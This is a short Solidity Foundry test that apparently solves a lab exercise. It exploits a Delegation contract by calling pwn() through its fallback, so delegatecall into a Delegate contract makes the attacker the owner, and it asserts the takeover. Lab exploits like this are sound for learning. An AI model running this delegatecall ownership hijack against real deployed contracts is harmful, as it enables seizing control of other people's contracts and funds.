// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Test.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";
contract DelegationTest is Test {
    Delegation public delegationContract;
    Delegate public delegateContract;
    address public attacker;
    address public owner;
    function setUp() public {
        attacker = vm.addr(1);
        owner = vm.addr(2);
        delegateContract = new Delegate(owner);
        delegationContract = new Delegation(address(delegateContract));    
    }
    function testExploit() public {
        vm.startPrank(attacker);
        address(delegationContract).call(abi.encodeWithSignature("pwn()"));
        vm.stopPrank();
        assertEq(delegationContract.owner(), attacker);
    }
}
